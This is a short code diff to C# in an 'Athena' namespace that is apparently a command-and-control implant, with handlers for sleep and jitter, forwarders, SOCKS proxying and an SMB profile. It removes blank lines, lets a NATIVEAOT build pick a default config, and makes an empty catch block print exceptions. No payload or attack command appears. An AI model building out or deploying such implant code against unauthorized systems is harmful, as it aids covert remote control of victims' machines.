@@ -39,7 +39,6 @@ namespace Athena
             this.availableForwarders = GetForwarders();
             this.currentConfig = SelectConfig(null);
             this.forwarder = SelectForwarder(null);
-  
             this.commandHandler = new CommandHandler();
             this.commandHandler.SetSleepAndJitter += SetSleepAndJitter;
             this.commandHandler.StartForwarder += StartForwarder;
@@ -49,7 +48,6 @@ namespace Athena
             this.commandHandler.StopSocks += StopSocks;
             this.commandHandler.ExitRequested += ExitRequested;
             this.commandHandler.SetProfile += SetProfile;
-
             this.socksHandler = new SocksHandler();
             
 
@@ -60,7 +58,7 @@ namespace Athena
         /// <param name="choice">The config to switch to, if null a random one will be selected</param>
         private IConfig SelectConfig(string choice)
         {
-#if DEBUG
+#if DEBUG || NATIVEAOT
             if(choice is null)
                 return availableProfiles.FirstOrDefault().Value;
 #endif
@@ -160,9 +158,9 @@ profiles.Add("Athena.Profiles.SMB");
                         }
                     }
                 }
-                catch
+                catch (Exception e)
                 {
-                    
+                    Console.WriteLine(e.ToString());
                 }
             }
 #endif
